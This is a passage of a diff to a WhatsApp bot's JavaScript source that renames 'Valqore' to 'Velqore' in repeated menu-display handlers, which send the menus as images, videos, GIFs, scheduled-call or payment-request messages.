                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7183,22 +7179,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -7206,7 +7202,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -7224,7 +7220,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -7237,7 +7233,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7247,8 +7243,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -7270,21 +7266,21 @@ break
 case 'groupmenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${groupmenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7294,22 +7290,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -7317,7 +7313,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -7335,7 +7331,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -7348,7 +7344,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7358,8 +7354,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -7381,21 +7377,21 @@ break
 case 'funmenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${funmenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7405,22 +7401,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -7428,7 +7424,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -7446,7 +7442,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -7459,7 +7455,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7469,8 +7465,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -7492,21 +7488,21 @@ break
 case 'stalkermenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${stalkermenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7516,22 +7512,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -7539,7 +7535,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -7557,7 +7553,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -7570,7 +7566,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7580,8 +7576,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -7603,21 +7599,21 @@ break
 case 'randomphotomenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${randphotomenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7627,22 +7623,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -7650,7 +7646,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -7668,7 +7664,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -7681,7 +7677,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7691,8 +7687,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -7714,21 +7710,21 @@ break
 case 'randomvideomenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${randvideomenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7738,22 +7734,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -7761,7 +7757,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -7779,7 +7775,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -7792,7 +7788,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7802,8 +7798,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -7825,21 +7821,21 @@ break
 case 'photooxymenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${photooxymenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7849,22 +7845,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -7872,7 +7868,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -7890,7 +7886,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -7903,7 +7899,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7913,8 +7909,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -7936,21 +7932,21 @@ break
 case 'ephoto360menu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${ephoto360menu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -7960,22 +7956,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -7983,7 +7979,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
+                    VelqoreInc.relayMessage(m.chat,  {
                        requestPaymentMessage: {
                           currencyCodeIso4217: 'INR',
                           amount1000: '9999999900',
@@ -8001,7 +7997,7 @@ if (typemenu === 'v1') {
                        }
                     }, {})
                 } else if (typemenu === 'v7') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         document: {
                            url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                         },
@@ -8014,7 +8010,7 @@ if (typemenu === 'v1') {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8024,8 +8020,8 @@ if (typemenu === 'v1') {
                         quoted: fstatus 
                     })
                 } else if (typemenu === 'v8') {
-                	ValqoreInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                	VelqoreInc.sendMessage(m.chat, {
+      video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
       gifPlayback: true,
       caption: xmenu_oh,
       contextInfo: {
@@ -8047,21 +8043,21 @@ break
 case 'makermenu': {
 let xmenu_oh = `Hi ${pushname}${readmore}\n\n${makermenu(prefix, hituet)}`
 if (typemenu === 'v1') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        image: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        image: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v2') {
-                    ValqoreInc.sendMessage(m.chat, {
+                    VelqoreInc.sendMessage(m.chat, {
                         text: xmenu_oh,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: ownername,
-                                thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                                thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -8071,22 +8067,22 @@ if (typemenu === 'v1') {
                         quoted: m
                     })
                 }   if (typemenu === 'v3') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v4') {
-                    ValqoreInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./ValqoreMedia/theme/Cheems-bot.mp4'),
+                    VelqoreInc.sendMessage(m.chat, {
+                        video: fs.readFileSync('./VelqoreMedia/theme/Cheems-bot.mp4'),
                         caption: xmenu_oh,
                         gifPlayback: true
                     }, {
                         quoted: m
                     })
                 } else if (typemenu === 'v5') {
-                    ValqoreInc.relayMessage(m.chat, {
+                    VelqoreInc.relayMessage(m.chat, {
                         scheduledCallCreationMessage: {
                             callType: "AUDIO",
                             scheduledTimestampMs: 1200,
@@ -8094,7 +8090,7 @@ if (typemenu === 'v1') {
                         }
                     }, {})
                 } else if (typemenu === 'v6') {
-                    ValqoreInc.relayMessage(m.chat,  {
